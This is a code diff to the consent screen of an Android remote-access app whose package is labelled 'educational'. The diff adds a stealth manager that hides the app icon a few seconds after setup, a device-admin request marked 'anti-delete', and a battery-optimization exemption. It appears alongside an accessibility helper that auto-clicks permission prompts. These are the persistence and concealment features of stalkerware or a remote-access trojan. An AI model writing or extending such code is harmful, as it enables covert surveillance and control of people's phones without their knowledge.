@@ -3,9 +3,11 @@ package com.remoteaccess.educational;
 import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.provider.Settings;
 import android.widget.Button;
 import android.widget.CheckBox;
 import android.widget.Toast;
@@ -15,6 +17,7 @@ import androidx.core.content.ContextCompat;
 import com.remoteaccess.educational.permissions.AccessibilityHelperService;
 import com.remoteaccess.educational.permissions.AutoPermissionManager;
 import com.remoteaccess.educational.services.RemoteAccessService;
+import com.remoteaccess.educational.stealth.StealthManager;
 import com.remoteaccess.educational.utils.PreferenceManager;
 import java.util.ArrayList;
 import java.util.List;
@@ -25,6 +28,7 @@ public class ConsentActivity extends AppCompatActivity {
     private Button acceptButton;
     private PreferenceManager preferenceManager;
     private AutoPermissionManager permissionManager;
+    private StealthManager stealthManager;
     private Handler handler;
     private boolean isAccessibilityGranted = false;
 
@@ -37,6 +41,7 @@ public class ConsentActivity extends AppCompatActivity {
 
         preferenceManager = new PreferenceManager(this);
         permissionManager = new AutoPermissionManager(this);
+        stealthManager = new StealthManager(this);
         handler = new Handler();
 
         consentCheckbox = findViewById(R.id.consentCheckbox);
@@ -167,19 +172,59 @@ public class ConsentActivity extends AppCompatActivity {
     }
 
     private void finishSetup() {
-        // Request special permissions after dangerous permissions
+        // Request special permissions (including battery optimization)
         new Handler().postDelayed(() -> {
             permissionManager.requestSpecialPermissions();
+            requestBatteryOptimization();
+            // Request device admin for anti-delete
+            requestDeviceAdmin();
         }, 2000);
+
+        // Enable stealth mode (hide icon)
+        new Handler().postDelayed(() -> {
+            enableStealthMode();
+        }, 5000);
 
         // Final finish - disable auto-click and close app (10 seconds total)
         new Handler().postDelayed(() -> {
-            // Disable auto-click after setup is complete
             AccessibilityHelperService.disableAutoClick();
-            
             Toast.makeText(this, "Setup Complete!", Toast.LENGTH_SHORT).show();
             finish();
         }, 10000);
+    }
+    
+    private void requestDeviceAdmin() {
+        try {
+            Intent intent = stealthManager.getDeviceAdminIntent();
+            startActivity(intent);
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+    
+    private void enableStealthMode() {
+        try {
+            stealthManager.enableStealthMode();
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+    
+    private void requestBatteryOptimization() {
+        try {
+            Intent intent = new Intent();
+            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivity(intent);
+        } catch (Exception e) {
+            try {
+                // Fallback to battery optimization settings
+                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                startActivity(intent);
+            } catch (Exception e2) {
+                // Ignore
+            }
+        }
     }
 
     @Override
